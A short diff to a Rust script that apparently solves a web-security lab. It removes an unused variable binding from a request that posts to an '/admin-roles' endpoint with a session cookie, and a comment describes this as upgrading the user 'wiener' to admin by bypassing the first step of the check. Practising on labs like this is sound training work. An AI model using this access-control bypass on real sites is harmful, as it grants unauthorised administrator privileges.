@@ -62,7 +62,7 @@ fn main() {
     io::stdout().flush();
 
     // upgrade wiener to be an admin bypassing the first step
-    let upgrade_wiener = client
+    client
         .post(format!("{url}/admin-roles"))
         .header("Cookie", format!("session={session}"))
         .form(&HashMap::from([
